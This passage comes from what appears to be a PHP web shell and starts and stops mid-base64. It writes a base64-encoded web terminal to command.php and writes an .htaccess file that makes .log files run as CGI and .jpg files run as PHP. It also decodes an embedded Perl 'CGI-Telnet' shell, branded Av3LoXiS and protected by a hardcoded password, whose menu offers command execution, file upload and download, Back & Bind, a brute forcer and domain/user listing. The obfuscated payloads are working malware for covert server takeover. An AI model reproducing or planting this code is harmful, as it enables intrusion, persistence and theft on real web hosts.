cmVudF9saW5lIDwgY29tbWFuZF9oaXN0Lmxlbmd0aC0xKSB7DQpjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXSA9IGRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWU7DQpjdXJyZW50X2xpbmUrKzsNCmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsNCn0NCmlmIChlLmtleUNvZGUgPT0gNDAgJiYgY3VycmVudF9saW5lID4gMCkgew0KY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV0gPSBkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlOw0KY3VycmVudF9saW5lLS07DQpkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlID0gY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV07DQp9DQp9DQpmdW5jdGlvbiBpbml0KCkgew0KZG9jdW1lbnQuc2hlbGwuc2V0QXR0cmlidXRlKCJhdXRvY29tcGxldGUiLCAib2ZmIik7DQpkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsVG9wID0gZG9jdW1lbnQuc2hlbGwub3V0cHV0LnNjcm9sbEhlaWdodDsNCmRvY3VtZW50LnNoZWxsLmNvbW1hbmQuZm9jdXMoKTsNCn0NCjwvc2NyaXB0Pg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkge2ZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOyBjb2xvcjogYmxhY2s7IGJhY2tncm91bmQ6IHdoaXRlO30NCnRhYmxle3dpZHRoOiAxMDAlOyBoZWlnaHQ6IDI1MHB4OyBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOyBwYWRkaW5nOiAwcHg7IG1hcmdpbjogMHB4O30NCnRkLmhlYWR7YmFja2dyb3VuZC1jb2xvcjogIzUyOUFERTsgY29sb3I6ICNGRkZGRkY7IGZvbnQtd2VpZ2h0OjcwMDsgYm9yZGVyOiBub25lOyB0ZXh0LWFsaWduOiBjZW50ZXI7IGZvbnQtc3R5bGU6IGl0YWxpY30NCnRleHRhcmVhIHt3aWR0aDogMTAwJTsgYm9yZGVyOiBub25lOyBwYWRkaW5nOiAycHggMnB4IDJweDsgY29sb3I6ICNDQ0NDQ0M7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7fQ0KcC5wcm9tcHQge2ZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IG1hcmdpbjogMHB4OyBwYWRkaW5nOiAwcHggMnB4IDJweDsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQ0KaW5wdXQucHJvbXB0IHtib3JkZXI6IG5vbmU7IGZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGNvbG9yOiAjQ0NDQ0NDO30NCjwvc3R5bGU+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9ImluaXQoKSI+DQo8aDI+RGV2ZWxvcGVyIEJ5IEt5bUxqbms8L2gyPg0KDQo8P3BocCBpZiAoZW1wdHkoJF9SRVFVRVNUWydyb3dzJ10pKSAkX1JFUVVFU1RbJ3Jvd3MnXSA9IDI2OyA/Pg0KDQo8dGFibGUgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4NCjx0cj48dGQgY2xhc3M9ImhlYWQiIHN0eWxlPSJjb2xvcjogIzAwMDAwMDsiPjxiPlBXRCA6PC9iPjwvdGQ+DQo8dGQgY2xhc3M9ImhlYWQiPjw/cGhwIGVjaG8gJF9TRVNTSU9OWydwcm9tcHQnXS4iOiIuIiRfU0VTU0lPTltjd2RdIjsgPz4NCjwvdGQ+PC90cj4NCjx0cj48dGQgd2lkdGg9JzEwMCUnIGhlaWdodD0nMTAwJScgY29sc3Bhbj0nMic+PGZvcm0gbmFtZT0ic2hlbGwiIGFjdGlvbj0iPD9waHAgZWNobyAkX1NFUlZFUlsnUEhQX1NFTEYnXTs/PiIgbWV0aG9kPSJwb3N0Ij4NCjx0ZXh0YXJlYSBuYW1lPSJvdXRwdXQiIHJlYWRvbmx5PSJyZWFkb25seSIgY29scz0iODUiIHJvd3M9Ijw/cGhwIGVjaG8gJF9SRVFVRVNUWydyb3dzJ10gPz4iPg0KPD9waHANCiRsaW5lcyA9IHN1YnN0cl9jb3VudCgkX1NFU1NJT05bJ291dHB1dCddLCAiXG4iKTsNCiRwYWRkaW5nID0gc3RyX3JlcGVhdCgiXG4iLCBtYXgoMCwgJF9SRVFVRVNUWydyb3dzJ10rMSAtICRsaW5lcykpOw0KZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOw0KPz4NCjwvdGV4dGFyZWE+DQo8cCBjbGFzcz0icHJvbXB0Ij48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjo+IjsgPz4NCjxpbnB1dCBjbGFzcz0icHJvbXB0IiBuYW1lPSJjb21tYW5kIiB0eXBlPSJ0ZXh0IiBvbmtleXVwPSJrZXkoZXZlbnQpIiBzaXplPSI2MCIgdGFiaW5kZXg9IjEiPg0KPC9wPg0KDQo8PyAvKjxwPg0KPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IkV4ZWN1dGUgQ29tbWFuZCIgLz4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJlc2V0IiB2YWx1ZT0iUmVzZXQiIC8+DQpSb3dzOiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icm93cyIgdmFsdWU9Ijw/cGhwIGVjaG8gJF9SRVFVRVNUWydyb3dzJ10gPz4iIC8+DQo8L3A+DQoqLz8+DQo8L2Zvcm0+PC90ZD48L3RyPg0KPC9ib2R5Pg0KPC9odG1sPg0KPD9waHAgPz4=';
    $file       = fopen("command.php", "w+");
    $write      = fwrite($file, base64_decode($perltoolss));
    fclose($file);
    echo "<iframe src=command.php width=63% height=700px frameborder=0></iframe> ";
	}elseif ($action == 'av3.log') {
@mkdir("error", 0755);
chdir("error");
$kokdosya  = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen($dosya_adi, 'w') or die("Can not open file!");
$metin = "Options +FollowSymLinks +Indexes
DirectoryIndex default.html
## START ##
Options +ExecCGI
AddHandler cgi-script log cgi pl tg love h4 tgb x-zone
AddType application/x-httpd-php .jpg
RewriteEngine on
RewriteRule (.*)\war$ .log
## END ##";
fwrite($dosya, $metin);
fclose($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS40IjsNCiRFZGl0UGVyc2lvbj0iQXYzTG9YaVMiOw0KDQokUGFzc3dvcmQgPSAiQXYzTG9YaVMiOwkJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KCQkJCSMgdG8gbG9naW4uDQpzdWIgSXNfV2luKCl7DQoJJG9zID0gJnRyaW0oJEVOVnsiU0VSVkVSX1NPRlRXQVJFIn0pOw0KCWlmKCRvcyA9fiBtL3dpbi9pKXsNCgkJcmV0dXJuIDE7DQoJfWVsc2V7DQoJCXJldHVybiAwOw0KCX0NCn0NCiRXaW5OVCA9ICZJc19XaW4oKTsJCQkjIFlvdSBuZWVkIHRvIGNoYW5nZSB0aGUgdmFsdWUgb2YgdGhpcyB0byAxIGlmDQoJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91DQoJCQkJCSMgY2FuIGxlYXZlIHRoZSB2YWx1ZSBhcyBpdCBpcy4NCg0KJE5UQ21kU2VwID0gIiYiOwkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gV2luZG93cyBOVC4NCg0KJFVuaXhDbWRTZXAgPSAiOyI7CQkJIyBUaGlzIGNoYXJhY3RlciBpcyB1c2VkIHRvIHNlcGVyYXRlIDIgY29tbWFuZHMNCgkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJhdGlvbiA9IDEwOwkJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQNCgkJCQkJIyBEb24ndCBzZXQgdGhpcyB0byBhIHZlcnkgbGFyZ2UgdmFsdWUuIFRoaXMgaXMNCgkJCQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuDQoJCQkJCSMgVGhpcyBpcyB2YWxpZCBvbmx5IG9uIFVuaXggc2VydmVycy4gSXQgaXMNCgkJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkJIyBJZiB0aGlzIGlzIDEsIHRoZW4gZGF0YSBpcyBzZW50IHRvIHRoZQ0KCQkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQNCgkJCQkJIyBjb21wbGV0ZXMuIFRoaXMgaXMgdXNlZnVsIGZvciBjb21tYW5kcyBsaWtlDQoJCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQoJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUgVU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDogInB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KJGNvbHM9IDEzMDsNCiRyb3dzPSAyNjsNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUmVhZHMgdGhlIGlucHV0IHNlbnQgYnkgdGhlIGJyb3dzZXIgYW5kIHBhcnNlcyB0aGUgaW5wdXQgdmFyaWFibGVzLiBJdA0KIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLg0KIyBUaGUgZmlsZW5hbWUgaXMgc3RvcmVkIGluICRpbnsnZid9IGFuZCB0aGUgZGF0YSBpcyBzdG9yZWQgaW4gJGlueydmaWxlZGF0YSd9Lg0KIyBPdGhlciB2YXJpYWJsZXMgY2FuIGJlIGFjY2Vzc2VkIHVzaW5nICRpbnsndmFyJ30sIHdoZXJlIHZhciBpcyB0aGUgbmFtZSBvZg0KIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQ0KIyBzY3JpcHRzLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJlYWRQYXJzZSANCnsNCglsb2NhbCAoKmluKSA9IEBfIGlmIEBfOw0KCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoJJE11bHRpcGFydEZvcm1EYXRhID0gJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBib3VuZGFyeT0oLispJC87DQoJaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0NCgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoJIyBoYW5kbGUgZmlsZSB1cGxvYWQgZGF0YQ0KCWlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0KCXsNCgkJJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCgkJQGxpc3QgPSBzcGxpdCgvJEJvdW5kYXJ5LywgJGluKTsgDQoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07DQoJCSRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCgkJJEhlYWRlciA9ICRgOw0KCQkkQm9keSA9ICQnOw0KIAkJJEJvZHkgPX4gcy9cclxuJC8vOyAjIHRoZSBsYXN0IFxyXG4gd2FzIHB1dCBpbiBieSBOZXRzY2FwZQ0KCQkkaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyANCgkJJGlueydmJ30gPSAkMTsgDQoJCSRpbnsnZid9ID1+IHMvXCIvL2c7DQoJCSRpbnsnZid9ID1+IHMvXHMvL2c7DQoNCgkJIyBwYXJzZSB0cmFpbGVyDQoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQoJCXsgDQoJCQkkbGlzdFskaV0gPX4gcy9eLituYW1lPSQvLzsNCgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsNCgkJCSRrZXkgPSAkMTsNCgkJCSR2YWwgPSAkJzsNCgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7DQoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9ID0gJHZhbDsgDQoJCX0NCgl9DQoJZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQoJew0KCQlAaW4gPSBzcGxpdCgvJi8sICRpbik7DQoJCWZvcmVhY2ggJGkgKDAgLi4gJCNpbikNCgkJew0KCQkJJGluWyRpXSA9fiBzL1wrLyAvZzsNCgkJCSgka2V5LCAkdmFsKSA9IHNwbGl0KC89LywgJGluWyRpXSwgMik7DQoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSAuPSAiIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsNCgkJCSRpbnska2V5fSAuPSAkdmFsOw0KCQl9DQoJfQ0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBmdW5jdGlvbiBFbmNvZGVEaXI6IGVuY29kZSBiYXNlNjQgUGF0aA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEVuY29kZURpcg0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCgkkZGlyID0gdHJpbShlbmNvZGVfYmFzZTY0KCRkaXIpKTsNCgkkZGlyID1+IHMvKFxyfFxuKS8vOw0KCXJldHVybiAkZGlyOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglteSAkaWQgPSBgaWRgIGlmKCEkV2luTlQpOw0KCW15ICRpbmZvID0gYHVuYW1lIC1zIC1uIC1yIC1pYDsNCglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCglwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQo8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+DQo8dGl0bGU+JFZlcnNpb248L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZmY7DQp9DQp0cix0ZCx0YWJsZSxpbnB1dCx0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCn0NCiNkb21haW4gdHI6aG92ZXJ7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjNDQ0Ow0KfQ0KdGQgew0KY29sb3I6ICMyQkE4RUM7DQp9DQoubGlzdGRpciB0ZHsNCgl0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQoubGlzdGRpciB0aHsNCgljb2xvcjogI0ZGOTkwMDsNCn0NCi5kaXIsLmZpbGUNCnsNCgl0ZXh0LWFsaWduOiBsZWZ0ICFpbXBvcnRhbnQ7DQp9DQouZGlyew0KCWZvbnQtc2l6ZTogMTBwdDsgDQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQp0YWJsZSB7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMTExOw0KfQ0KaW5wdXQgew0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCmNvZGUgew0KYm9yZGVyOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogd2hpbGU7DQp9DQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogI0ZGMDBBQTsNCn0NCnRleHRhcmVhIHsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCi5saXN0ZGlyIHRyOmhvdmVyew0KCWJhY2tncm91bmQ6ICM0NDQ7DQp9DQoubGlzdGRpciB0cjpob3ZlciB0ZHsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lOw0KfQ0KLm5vdGxpbmV7DQoJYmFja2dyb3VuZDogIzExMTsNCn0NCi5saW5lew0KCWJhY2tncm91bmQ6ICMyMjI7DQp9DQo8L3N0eWxlPg0KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQpmdW5jdGlvbiBFbmNvZGVyKG5hbWUpDQp7DQoJdmFyIGUgPSAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQobmFtZSk7DQoJZS52YWx1ZSA9IGJ0b2EoZS52YWx1ZSk7DQoJcmV0dXJuIHRydWU7DQp9DQpmdW5jdGlvbiBjaG1vZF9mb3JtKGksZmlsZSkNCnsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyB2YWx1ZT1UYW1hbT48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRFbmNvZGVDdXJyZW50RGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkNCnsNCglyZXNwb25zZS5pbm5lckhUTUwgPSAiPHNwYW4gb25jbGljaz1cXFwiY2htb2RfZm9ybSgiICsgaSArICIsJyIrIGZpbGUrICInKVxcXCIgPiIrIHBlcm1zICsiPC9zcGFuPjwvdGQ+IjsNCn0NCmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOw0KCXZhciBiYWNrPSJybV9yZW5hbWVfZm9ybSgiK2krIixcXFwiIitmaWxlKyJcXFwiLFxcXCIiK2YrIlxcXCIpOyByZXR1cm4gZmFsc2U7IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScnIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgdmFsdWU9VGFtYW0+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9SXB0YWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckRW5jb2RlQ3VycmVudERpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOw0KCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0ZXh0XyIgKyBpKS5mb2N1cygpOw0KfQ0KZnVuY3Rpb24gcm1fcmVuYW1lX2Zvcm0oaSxmaWxlLGYpDQp7DQoJaWYoZj09J2YnKQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0kRW5jb2RlQ3VycmVudERpciZjPWVkaXQlMjAiK2ZpbGUrIiUyMCc+IiArZmlsZSsgIjwvYT4iOw0KCX1lbHNlDQoJew0KCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Z3VpJmQ9IitmKyInPlsgIiArZmlsZSsgIiBdPC9hPiI7DQoJfQ0KfQ0KPC9zY3JpcHQ+DQo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzBjMGMwYyIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4NCjxjZW50ZXI+PGNvZGU+DQo8dGFibGUgYm9yZGVyPSIxIiB3aWR0aD0iMTAwJSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIyIj4NCjx0cj4NCgk8dGQgYWxpZ249ImNlbnRlciIgcm93c3Bhbj0zPg0KCQk8Yj48Zm9udCBzaXplPSIzIj5vLS0tWyAgJEVkaXRQZXJzaW9uIF0tLS1vPC9mb250PjwvYj4NCgk8L3RkPg0KCTx0ZD4NCgkJJGluZm8NCgk8L3RkPg0KCTx0ZD5TZXJ2ZXIgSVA6PGZvbnQgY29sb3I9IiNmZjk5MDAiPiAkRU5WeydTRVJWRVJfQUREUid9PC9mb250PiB8IFNlbmluIElQOiA8Zm9udCBjb2xvcj0iI2ZmOTkwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4NCgk8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+QW5hc2F5ZmE8L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXIiPktvbXV0IENhbGlzdGlyPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1ndWkmZD0kRW5jb2RlQ3VycmVudERpciI+R1VJPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9dXBsb2FkJmQ9JEVuY29kZUN1cnJlbnREaXIiPkRvc3lhIFl1a2xlPC9hPiB8IA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG93bmxvYWQmZD0kRW5jb2RlQ3VycmVudERpciI+RG9zeWEgSW5kaXI8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkxvZ2xhcmkgSW5jZWxlPC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb21haW5zdXNlciI+RG9tYWlubGVyL0t1bGxhbmljaWxhcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9bG9nb3V0Ij5DaWtpczwvYT4gfA0KPGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9Imh0dHA6Ly9hdjNsb3hpcy5ob2wuZXMvIj5DZXZpcmk8L2E+DQo8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIj4NCiRpZA0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KPGZvbnQgaWQ9IlJlc3BvbnNlRGF0YSIgY29sb3I9IiNGRkZGRkYiID4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0